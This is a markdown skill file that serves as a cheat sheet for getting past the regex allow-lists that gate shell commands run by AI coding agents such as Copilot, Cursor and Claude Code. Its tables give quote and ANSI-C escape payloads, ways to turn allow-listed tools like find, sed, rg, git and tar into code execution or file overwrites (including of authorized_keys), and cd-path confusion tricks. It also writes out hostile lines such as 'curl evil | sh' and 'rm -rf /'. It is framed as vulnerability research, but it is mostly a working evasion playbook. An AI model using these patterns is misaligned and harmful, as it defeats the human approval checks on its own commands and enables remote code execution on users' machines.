---
name: shell-allowlist-bypass-patterns
description: Bypass cheat sheet for regex-on-text shell command allow-listing used by AI coding agents. Covers quote-concatenation, ANSI-C quoting, function shadowing, alias, env prefix, cd-prefix confusion. Use when a target gates LLM-generated shell commands with per-subcommand regex (VSCode Copilot, Cursor, Claude Code, MCP servers).
---

# Shell Allow-list Bypass Patterns

Cheat sheet for bypassing regex-based command allow-listing where the regex tests the raw sub-command text (pre-shell-unquoting) but the shell strips quotes before exec.

## Core insight

Every allow-list of the form `\s-flag\b` or `\s--flag\b` operates on a string. Shell quoting inserts characters between the space and the `-` that the regex doesn't know how to match, but the shell removes at exec. So the regex sees a benign argument while the real binary sees the dangerous flag.

Pair every candidate payload with this shell-side check:

```bash
bash -c "set -- <payload>; printf '%s\n' \"\$1\""
# output must be the real flag (e.g. -exec)
```

## Family A — Quote the flag

| Payload | Shell argv | Catches `\s-flag\b`? |
|---------|-----------|----------------------|
| `cmd '-flag' arg`        | `-flag` | no |
| `cmd "-flag" arg`        | `-flag` | no |
| `cmd -''flag arg`        | `-flag` | no (char after space is `-`, but after `-` is `'`) |
| `cmd -"f"lag arg`        | `-flag` | no (word boundary broken) |
| `cmd -f"l"ag arg`        | `-flag` | no — the one Microsoft documents |
| `cmd $'-flag' arg`       | `-flag` | no (ANSI-C quoting; not in any doc I've seen) |
| `cmd $'\x2d'flag arg`    | `-flag` | no (ANSI-C hex escape) |

Rule of thumb: any regex that depends on `\s-` or `\b` anchors on the unparsed string is bypassable.

## Family B — Abuse post-parse allow-listed commands

Once a "safe" command is allow-listed by name, use its own features to run code:

| Command | Weaponization | Notes |
|---------|---------------|-------|
| `find '-exec' <cmd> '{}' +` | arbitrary RCE | `-exec` and `-execdir` both work |
| `sed '-e' 'e <cmd>'` or `sed 's/a/b/e'` | RCE via `e` flag | GNU sed only; needs `s///e` |
| `rg '--pre' <binary>` | RCE — runs binary per searched file | ripgrep preprocessor flag |
| `sort '-o' <dst> <src>` | arbitrary file write | overwrite `~/.ssh/authorized_keys` |
| `date '-s' '...'` | system clock manipulation | needs CAP_SYS_TIME |
| `git '-c' 'core.sshCommand=<cmd>' fetch` | RCE via git config injection | |
| `xxd <in> <out>` | arbitrary file write | positional outfile |
| `tar --use-compress-program=<cmd>` | RCE | |

## Family C — Don't bother (usually caught)

These work in bash but tree-sitter-based parsers catch them because `(command) @command` reaches inside function bodies, command substitutions, and subshells.

| Payload | Why it fails |
|---------|--------------|
| `cd() { curl evil \| sh; }; cd /tmp` | function body's `curl` is its own `(command)` node → hits deny |
| `cat $(curl evil)` | inner `curl` extracted → denied |
| `echo \`rm -rf /\`` | backtick command substitution → `rm` extracted |
| `( rm -rf / )` | subshell contents extracted |
| `bash -c '...'` | but `bash` often not in allow list anyway; plus `-c` arg stays opaque in some parsers |

## Family D — Alias / environment (often neutralized)

| Payload | Neutralized by |
|---------|----------------|
| `alias cd='curl evil'; cd /tmp` | non-interactive shells don't expand aliases; also `alias` typically not allow-listed |
| `PATH=/tmp/evil:$PATH ls` | transient env regex `^[A-Z_][A-Z0-9_]*=/i` at start catches it |
| `FOO=bar; cmd` | `FOO=bar` extracted as its own command → doesn't match any allow rule → user prompt |

## Family E — cd-prefix confusion

When the parser allows `cd X && <allowed>` as "the whole line is approved if X is in workspace and the suffix is an allowed command", attack the path extraction:

- Single-quote the path: `cd '../../etc' && cat passwd` — extractor pulls `'../../etc'` verbatim including quotes, compares string-to-cwd incorrectly.
- Symlinks inside the workspace pointing outside.
- Regex anchors like `[^\s]+` match `'/etc'` (with quotes), so the directory-vs-cwd compare string-differs from the real shell cwd.

## Verification template

For any claimed bypass, show all four:

```
1. Baseline payload hits deny rule              → DENIED
2. Bypass payload passes allow rule             → AUTO-APPROVED
3. tree-sitter sub-command extraction list      → confirms single sub-command, malicious bits not isolated
4. `bash -c "set -- <bypass>; printf ..."`      → argv matches real attacker intent
```

If any one of those is missing, the bypass is not proven.

## Attribution

Family A — Microsoft publicly disclosed `-e"x"ec` class at code.visualstudio.com/docs/copilot/agents/agent-tools. ANSI-C variant is an extension. Family B weaponizations are standard GTFOBins-style knowledge. Family C/D/E observations from VSCode `chatAgentTools` source review, commit `cdfcb384`.
